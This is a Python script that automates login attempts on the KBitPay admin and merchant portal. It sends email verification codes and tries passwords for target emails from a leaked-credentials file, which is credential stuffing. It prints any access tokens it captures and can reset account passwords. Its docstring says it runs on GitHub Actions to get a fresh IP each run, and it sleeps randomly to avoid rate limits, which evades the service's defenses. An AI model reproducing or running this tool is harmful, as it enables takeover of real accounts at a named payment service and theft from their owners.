#!/usr/bin/env python3
"""KBitPay admin/mch portal email-code chain driver (runs on GitHub Actions runner,
fresh egress IP each run).

Modes:
  code   <email> <type>              CheckLastLogin + SentVerificationCode(send email code)
  verify <email> <type> <code>       CheckCaptchaCode(validate email code) + Login with
                                     candidate pwds from KBP_CREDS (email-matched lines)
  login  <email> <pwd>               plain Login (no image captcha field)
  reset  <email> <code> <newpwd>     ResetPassword {type:3} (sets new password)

Low-rate: random 8-15s sleeps between requests. SentVerificationCode sends ONE email;
everything else is read-only (reset is the only write op and is opt-in).
"""
import base64, json, os, random, sys, time, urllib.parse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from kbp_admin_login import Client

BASE = os.environ.get("KBP_BASE", "https://admin.kbitpay.com")
APPID = os.environ.get("KBP_APPID", "")
ISADMIN = os.environ.get("KBP_ISADMIN", "true").lower() != "false"


def pause():
    time.sleep(random.uniform(8, 15))


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "code"
    c = Client()
    print("[*] base=%s mode=%s appid=%r isAdmin=%s" % (BASE, mode, APPID, ISADMIN), flush=True)
    c.fetch_key()
    print("[*] key ok", flush=True)

    if mode == "code":
        em = sys.argv[2]; typ = sys.argv[3] if len(sys.argv) > 3 else "2"
        try:
            r = c.get("/api/Login/CheckLastLogin?email=" + urllib.parse.quote(em))
            print("CODE %s CheckLastLogin -> %s" % (em, json.dumps(r, ensure_ascii=False)[:300]), flush=True)
        except Exception as e:
            print("CODE CheckLastLogin ERR %s" % e, flush=True)
        pause()
        r = c.post_enc("/api/User/SentVerificationCode", {"email": em, "type": typ})
        print("CODE %s SentVerificationCode type=%s -> %s" % (em, typ, json.dumps(r, ensure_ascii=False)[:300]), flush=True)

    elif mode == "chk":
        em = sys.argv[2]; typ = sys.argv[3]; code = sys.argv[4]
        r = c.post_enc("/api/Register/CheckCaptchaCode", {"email": em, "code": code, "type": typ})
        print("CHK %s CheckCaptchaCode(type=%s) -> %s" % (em, typ, json.dumps(r, ensure_ascii=False)[:300]), flush=True)

    elif mode == "verify":
        em = sys.argv[2]; typ = sys.argv[3]; code = sys.argv[4]
        r = c.post_enc("/api/Register/CheckCaptchaCode", {"email": em, "code": code, "type": typ})
        print("VERIFY %s CheckCaptchaCode -> %s" % (em, json.dumps(r, ensure_ascii=False)[:300]), flush=True)
        pause()
        pwds = []
        try:
            for line in open("/tmp/kbp_creds.txt"):
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                e, p = line.split("|", 1)
                if e.lower() == em.lower():
                    pwds.append(p)
        except Exception as ex:
            print("[!] creds file unavailable: %s" % ex, flush=True)
        if not pwds:
            print("[!] no pwd candidate for %s in creds" % em, flush=True)
        for pwd in pwds[:3]:
            r = c.post_enc("/api/Login/Login", {"appID": APPID,
                           "pwd": base64.b64encode(pwd.encode()).decode(),
                           "email": em, "isAdmin": ISADMIN, "language": "en"})
            rd = r.get("ResData")
            tok = ""
            if isinstance(rd, dict):
                tok = rd.get("AccessToken") or rd.get("accessToken") or ""
            print("VERIFY LOGIN %s -> ErrCode=%s ErrMsg=%s Success=%s token=%s" % (
                em, r.get("ErrCode"), r.get("ErrMsg"), r.get("Success"),
                (tok[:60] + "...") if tok else ""), flush=True)
            if tok:
                print("TOKEN %s" % tok, flush=True)
                break
            if "4047" in str(r.get("ErrCode")):
                break
            pause()

    elif mode == "login":
        em = sys.argv[2]; pwd = sys.argv[3]
        r = c.post_enc("/api/Login/Login", {"appID": APPID,
                       "pwd": base64.b64encode(pwd.encode()).decode(),
                       "email": em, "isAdmin": ISADMIN, "language": "en"})
        print("LOGIN %s -> ErrCode=%s ErrMsg=%s Success=%s" % (
            em, r.get("ErrCode"), r.get("ErrMsg"), r.get("Success")), flush=True)
        rd = r.get("ResData")
        if isinstance(rd, dict) and (rd.get("AccessToken") or rd.get("accessToken")):
            print("TOKEN %s" % (rd.get("AccessToken") or rd.get("accessToken")), flush=True)

    elif mode == "reset":
        em = sys.argv[2]; code = sys.argv[3]; newpwd = sys.argv[4]
        r = c.post_enc("/api/User/ResetPassword", {"email": em, "code": code,
                       "pwd": base64.b64encode(newpwd.encode()).decode(), "type": "3"})
        print("RESET %s -> %s" % (em, json.dumps(r, ensure_ascii=False)[:300]), flush=True)

    elif mode == "reset2":
        em = sys.argv[2]; code = sys.argv[3]; newpwd = sys.argv[4]
        r = c.post_enc("/api/Register/CheckCaptchaCode", {"email": em, "code": code, "type": "3"})
        print("RESET2 CheckCaptchaCode(type3) -> %s" % (json.dumps(r, ensure_ascii=False)[:300]), flush=True)
        pause()
        r = c.post_enc("/api/User/ResetPassword", {"email": em, "code": code,
                       "pwd": base64.b64encode(newpwd.encode()).decode(), "type": "3"})
        print("RESET2 ResetPassword -> %s" % (json.dumps(r, ensure_ascii=False)[:300]), flush=True)

    print("[*] done", flush=True)


if __name__ == "__main__":
    main()
